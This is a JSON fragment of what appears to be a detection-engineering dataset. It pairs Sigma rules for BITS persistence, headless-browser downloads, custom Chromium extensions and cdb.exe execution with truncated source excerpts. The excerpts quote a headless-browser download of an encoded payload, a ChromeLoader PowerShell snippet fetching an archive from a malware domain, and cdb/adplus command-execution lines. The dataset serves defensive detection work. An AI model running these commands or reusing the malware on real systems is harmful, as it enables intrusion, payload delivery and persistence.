      "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
      "status": "test",
      "description": "BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\nWhen the job runs on the system the command specified in the BITS job will be executed.\nThis can be abused by actors to create a backdoor within the system and for persistence.\nIt will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\n",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
        "http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html",
        "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394"
      ],
      "author": "Sreeman",
      "date": "2020-10-29",
      "modified": "2024-01-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_cli_notify_1": {
          "CommandLine|contains": "/SetNotifyCmdLine"
        },
        "selection_cli_notify_2": {
          "CommandLine|contains": [
            "%COMSPEC%",
            "cmd.exe",
            "regsvr32.exe"
          ]
        },
        "selection_cli_add_1": {
          "CommandLine|contains": "/Addfile"
        },
        "selection_cli_add_2": {
          "CommandLine|contains": [
            "http:",
            "https:",
            "ftp:",
            "ftps:"
          ]
        },
        "condition": "selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_potential_persistence.yml"
  },
  "80": {
    "url": "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394",
    "markdown": "# Internet Storm Center ## Wipe the drive! Stealthy Malware Persistence Mechanism - Part 1 **Published**: 2013-03-13. **Last Updated**: 2013-03-13 03:12:46 UTC At Shmoocon 2013, Jake Williams (@MalwareJake) and I gave a presentation entitled “Wipe the Drive”. The point of the presentation was that you should always wipe the drive and reinstall the OS after a confirmed malware infection. We all know wiping the drive is the safest move, but there are business pressures to simply remove the known malware and move on. Also, because we are security professionals, there is often an expectation that we are able to remove",
    "sigma_rule": {
      "title": "Monitoring For Persistence Via BITS",
      "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
      "status": "test",
      "description": "BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\nWhen the job runs on the system the command specified in the BITS job will be executed.\nThis can be abused by actors to create a backdoor within the system and for persistence.\nIt will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\n",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
        "http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html",
        "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394"
      ],
      "author": "Sreeman",
      "date": "2020-10-29",
      "modified": "2024-01-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_cli_notify_1": {
          "CommandLine|contains": "/SetNotifyCmdLine"
        },
        "selection_cli_notify_2": {
          "CommandLine|contains": [
            "%COMSPEC%",
            "cmd.exe",
            "regsvr32.exe"
          ]
        },
        "selection_cli_add_1": {
          "CommandLine|contains": "/Addfile"
        },
        "selection_cli_add_2": {
          "CommandLine|contains": [
            "http:",
            "https:",
            "ftp:",
            "ftps:"
          ]
        },
        "condition": "selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_potential_persistence.yml"
  },
  "81": {
    "url": "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
    "markdown": "# Post Jan 4, 2022 Another way to download files using msedge/chrome: ``` [msedge.exe | chrome.exe] --headless --enable-logging --disable-gpu --dump-dom \"http://server/evil.b64.html\" > out.b64 ``` - Downloaded file should end with `.html`. - Binaries should be encoded. ```image Description: The image displays a command line interface showing the execution of commands related to the download and decoding of a Base64 encoded file. It includes the following steps: a command to run Chrome in headless mode to dump the contents of a URL into a Base64 encoded HTML file, followed by a command using CertUtil to decode that file into an executable.",
    "sigma_rule": {
      "title": "Browser Execution In Headless Mode",
      "id": "ef9dcfed-690c-4c5d-a9d1-482cd422225c",
      "related": [
        {
          "id": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of Chromium based browser in headless mode",
      "references": [
        "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
        "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-09-12",
      "tags": [
        "attack.command-and-control",
        "attack.t1105"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--headless"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_headless_exec.yml"
  },
  "82": {
    "url": "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html",
    "markdown": "# Managed XDR Investigation of Ducktail in Trend Vision One™ **Date:** May 09, 2023 The Trend Micro Managed XDR team investigated several Ducktail-related web browser credential dumping incidents involving different customers. ## Introduction In July 2022, security researchers discovered an operation called Ducktail, in which threat actors used information-stealing malware to target individuals and employees who might have access to Facebook business accounts. The perpetrators launched a spear-phishing campaign via LinkedIn direct messages aimed at marketing and HR professionals. This scheme would allow the threat actor behind Ducktail to take over Facebook business accounts and abuse the ad function for",
    "sigma_rule": {
      "title": "Browser Execution In Headless Mode",
      "id": "ef9dcfed-690c-4c5d-a9d1-482cd422225c",
      "related": [
        {
          "id": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of Chromium based browser in headless mode",
      "references": [
        "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
        "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-09-12",
      "tags": [
        "attack.command-and-control",
        "attack.t1105"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--headless"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_headless_exec.yml"
  },
  "83": {
    "url": "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
    "markdown": "# Post Jan 4, 2022 Another way to download files using msedge/chrome: ``` [msedge.exe | chrome.exe] --headless --enable-logging --disable-gpu --dump-dom \"http://server/evil.b64.html\" > out.b64 ``` - Downloaded file should end with `.html`. - Binaries should be encoded. ```image Description: The image displays a command line interface showing the execution of commands related to the download and decoding of a Base64 encoded file. It includes the following steps: a command to run Chrome in headless mode to dump the contents of a URL into a Base64 encoded HTML file, followed by a command using CertUtil to decode that file into an executable.",
    "sigma_rule": {
      "title": "File Download with Headless Browser",
      "id": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
      "related": [
        {
          "id": "ef9dcfed-690c-4c5d-a9d1-482cd422225c",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files",
      "references": [
        "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
        "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html"
      ],
      "author": "Sreeman, Florian Roth (Nextron Systems)",
      "date": "2022-01-04",
      "modified": "2023-05-12",
      "tags": [
        "attack.command-and-control",
        "attack.t1105"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains|all": [
            "--headless",
            "dump-dom",
            "http"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_headless_file_download.yml"
  },
  "84": {
    "url": "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html",
    "markdown": "# Managed XDR Investigation of Ducktail in Trend Vision One™ **Date:** May 09, 2023 The Trend Micro Managed XDR team investigated several Ducktail-related web browser credential dumping incidents involving different customers. ## Introduction In July 2022, security researchers discovered an operation called Ducktail, in which threat actors used information-stealing malware to target individuals and employees who might have access to Facebook business accounts. The perpetrators launched a spear-phishing campaign via LinkedIn direct messages aimed at marketing and HR professionals. This scheme would allow the threat actor behind Ducktail to take over Facebook business accounts and abuse the ad function for",
    "sigma_rule": {
      "title": "File Download with Headless Browser",
      "id": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
      "related": [
        {
          "id": "ef9dcfed-690c-4c5d-a9d1-482cd422225c",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files",
      "references": [
        "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
        "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html"
      ],
      "author": "Sreeman, Florian Roth (Nextron Systems)",
      "date": "2022-01-04",
      "modified": "2023-05-12",
      "tags": [
        "attack.command-and-control",
        "attack.t1105"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains|all": [
            "--headless",
            "dump-dom",
            "http"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_headless_file_download.yml"
  },
  "85": {
    "url": "https://redcanary.com/blog/chromeloader/",
    "markdown": "# ChromeLoader: a pushy malvertiser **ChromeLoader might seem like a run-of-the-mill browser hijacker, but its peculiar use of PowerShell could spell deeper trouble.** **Originally published:** May 25, 2022. Last modified April 30, 2024. --- *Editor’s note: We’ve been researching this threat since early February. In recent days, we’ve observed what appears to be a resurgence in ChromeLoader activity. As a result, this research is based on analysis of threats spanning almost five months. That said, the detection guidance in this report provides defense-in-depth against ChromeLoader and a wide array of other threats.* ChromeLoader is a pervasive and persistent browser hijacker",
    "sigma_rule": {
      "title": "Chromium Browser Instance Executed With Custom Extension",
      "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
      "related": [
        {
          "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Usage of Chrome Extensions in testing tools such as BurpSuite will trigger this alert"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_load_extension.yml"
  },
  "86": {
    "url": "https://emkc.org/s/RJjuLa",
    "markdown": "Language: powershell ``` $extPath = \"$($env:LOCALAPPDATA)\\chrome\" $confPath = \"$extPath\\conf.js\" $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\" $taskName = \"ChromeLoader\" $domain = \"brokenna.work\" $isOpen = 0 $dd = 0 $ver = 0 (Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\") | Select-Object CommandLine | ForEach-Object { if($_ -Match \"load-extension\"){ break } $isOpen = 1 } if($isOpen){ if(-not(Test-Path -Path \"$extPath\")){ try{ wget \"https://$domain/archive.zip\" -outfile \"$archiveName\" }catch{ break } Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force Remove-Item \u0013 path \"$archiveName\" -Force } else{ try{ if (Test-Path -Path \"$confPath\") { $conf = Get-Content -Path $confPath $conf.Split(\";\") | ForEach-Object { if ($_ -Match \"dd\") { $dd = $_.Split('\"')[1] }elseif ($_ -Match \"ExtensionVersion\") { $ver",
    "sigma_rule": {
      "title": "Chromium Browser Instance Executed With Custom Extension",
      "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
      "related": [
        {
          "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Usage of Chrome Extensions in testing tools such as BurpSuite will trigger this alert"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_load_extension.yml"
  },
  "87": {
    "url": "https://www.mandiant.com/resources/blog/lnk-between-browsers",
    "markdown": "# A LNK Between Browsers: Hunting Methodologies and Extension Abusing Actors **May 1, 2023** --- Written by: Jared Wilson --- Two pillars in sleight of hand magic are *User Initiated Action*, where the target needs to believe their actions are their own, and *Hidden Action*, the trick needs to be concealed behind something ordinary and nonthreatening. Mandiant became aware of a chain of adversary methodologies that leverage these two pillars to achieve persistence. 1. The user executes an LNK shortcut file that, unbeknownst to them, has been tampered with. 2. The modified LNK shortcut file executes a legitimate browser, hiding",
    "sigma_rule": {
      "title": "Chromium Browser Instance Executed With Custom Extension",
      "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
      "related": [
        {
          "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Usage of Chrome Extensions in testing tools such as BurpSuite will trigger this alert"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_load_extension.yml"
  },
  "88": {
    "url": "https://redcanary.com/blog/chromeloader/",
    "markdown": "# ChromeLoader: a pushy malvertiser **ChromeLoader might seem like a run-of-the-mill browser hijacker, but its peculiar use of PowerShell could spell deeper trouble.** **Originally published:** May 25, 2022. Last modified April 30, 2024. --- *Editor’s note: We’ve been researching this threat since early February. In recent days, we’ve observed what appears to be a resurgence in ChromeLoader activity. As a result, this research is based on analysis of threats spanning almost five months. That said, the detection guidance in this report provides defense-in-depth against ChromeLoader and a wide array of other threats.* ChromeLoader is a pervasive and persistent browser hijacker",
    "sigma_rule": {
      "title": "Suspicious Chromium Browser Instance Executed With Custom Extension",
      "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
      "related": [
        {
          "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_susp_load_extension.yml"
  },
  "89": {
    "url": "https://emkc.org/s/RJjuLa",
    "markdown": "Language: powershell ``` $extPath = \"$($env:LOCALAPPDATA)\\chrome\" $confPath = \"$extPath\\conf.js\" $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\" $taskName = \"ChromeLoader\" $domain = \"brokenna.work\" $isOpen = 0 $dd = 0 $ver = 0 (Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\") | Select-Object CommandLine | ForEach-Object { if($_ -Match \"load-extension\"){ break } $isOpen = 1 } if($isOpen){ if(-not(Test-Path -Path \"$extPath\")){ try{ wget \"https://$domain/archive.zip\" -outfile \"$archiveName\" }catch{ break } Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force Remove-Item \u0013 path \"$archiveName\" -Force } else{ try{ if (Test-Path -Path \"$confPath\") { $conf = Get-Content -Path $confPath $conf.Split(\";\") | ForEach-Object { if ($_ -Match \"dd\") { $dd = $_.Split('\"')[1] }elseif ($_ -Match \"ExtensionVersion\") { $ver",
    "sigma_rule": {
      "title": "Suspicious Chromium Browser Instance Executed With Custom Extension",
      "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
      "related": [
        {
          "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_susp_load_extension.yml"
  },
  "90": {
    "url": "https://www.mandiant.com/resources/blog/lnk-between-browsers",
    "markdown": "# A LNK Between Browsers: Hunting Methodologies and Extension Abusing Actors **May 1, 2023** --- Written by: Jared Wilson --- Two pillars in sleight of hand magic are *User Initiated Action*, where the target needs to believe their actions are their own, and *Hidden Action*, the trick needs to be concealed behind something ordinary and nonthreatening. Mandiant became aware of a chain of adversary methodologies that leverage these two pillars to achieve persistence. 1. The user executes an LNK shortcut file that, unbeknownst to them, has been tampered with. 2. The modified LNK shortcut file executes a legitimate browser, hiding",
    "sigma_rule": {
      "title": "Suspicious Chromium Browser Instance Executed With Custom Extension",
      "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
      "related": [
        {
          "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_susp_load_extension.yml"
  },
  "91": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/",
    "markdown": "# /Cdb.exe Debugging tool included with Windows Debugging Tools. ### Paths: - C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe - C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe ### Resources: - http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html - https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options - https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda - https://mrd0x.com/the-power-of-cdb-debugging-tool/ - https://twitter.com/nas_bench/status/1534957360032120833 ### Detections: - Sigma: proc_creation_win_lolbin_cdb.yml - Elastic: defense_evasion_unusual_process_network_connection.toml - Elastic: defense_evasion_network_connection_from_windows_binary.toml - BlockRule: Microsoft recommended block rules ## Execute 1. Launch 64-bit shellcode from the `x64_calc.wds` file using `cdb.exe`. ``` cdb.exe -cf x64_calc.wds -o notepad.exe ``` **Use case**: Local execution of assembly shellcode. **Privileges required**: User **Operating systems**: Windows **ATT&CK® technique**: T1127: Trusted Developer Utilities Proxy Execution 2. Attaching to any process and executing shell commands. ```",
    "sigma_rule": {
      "title": "Potential Binary Proxy Execution Via Cdb.EXE",
      "id": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
      "status": "test",
      "description": "Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/",
        "https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
        "https://twitter.com/nas_bench/status/1534957360032120833"
      ],
      "author": "Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-26",
      "modified": "2024-04-22",
      "tags": [
        "attack.execution",
        "attack.t1106",
        "attack.defense-evasion",
        "attack.t1218",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cdb.exe"
          },
          {
            "OriginalFileName": "CDB.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            " -c ",
            " -cf "
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use of debugging tools"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cdb_arbitrary_command_execution.yml"
  },
  "92": {
    "url": "https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
    "markdown": "# Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner **Monday, August 15, 2016** Imagine you’ve gained access to an extremely locked down Windows 10 host running Device Guard. The Device Guard policy is such that all PEs (exe, dll, sys, etc.) must be signed by Microsoft. No other signed code is authorized. Additionally, a side effect of Device Guard being enabled is that PowerShell will be locked down in constrained language mode so arbitrary code execution is ruled out in the context of PowerShell (unless you have a bypass for that, of course). You have a shellcode payload",
    "sigma_rule": {
      "title": "Potential Binary Proxy Execution Via Cdb.EXE",
      "id": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
      "status": "test",
      "description": "Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/",
        "https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
        "https://twitter.com/nas_bench/status/1534957360032120833"
      ],
      "author": "Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-26",
      "modified": "2024-04-22",
      "tags": [
        "attack.execution",
        "attack.t1106",
        "attack.defense-evasion",
        "attack.t1218",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cdb.exe"
          },
          {
            "OriginalFileName": "CDB.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            " -c ",
            " -cf "
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use of debugging tools"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cdb_arbitrary_command_execution.yml"
  },
  "93": {
    "url": "https://twitter.com/nas_bench/status/1534957360032120833",
    "markdown": "# Post Jun 9, 2022 In the background, this is basically using \"cdb.exe\" with a debugging script. LOLBAS doesn't seem to have this one documented for cdb (https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/) so here it is. ``` cdb.exe -c $\"[PathToDebuggingScript]\" [Command] ``` ## Post Jun 9, 2022 We know from LOLBAS that adplus can be used to dump lsass (https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/). But you can also use it to run arbitrary commands and binaries with the \"-sc\" flag. #lolbin #lolbas ``` adplus.exe -crash -o [OutputDir] -sc [Command] ``` ## Comment Jun 9, 2022 The easiest way to get a copy of this script is to run",
    "sigma_rule": {
      "title": "Potential Binary Proxy Execution Via Cdb.EXE",
      "id": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
      "status": "test",
      "description": "Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/",
        "https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
        "https://twitter.com/nas_bench/status/1534957360032120833"
      ],
      "author": "Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-26",
      "modified": "2024-04-22",
      "tags": [
        "attack.execution",
        "attack.t1106",
        "attack.defense-evasion",
        "attack.t1218",
        "attack.t1127"
      ],
      "logsource": {
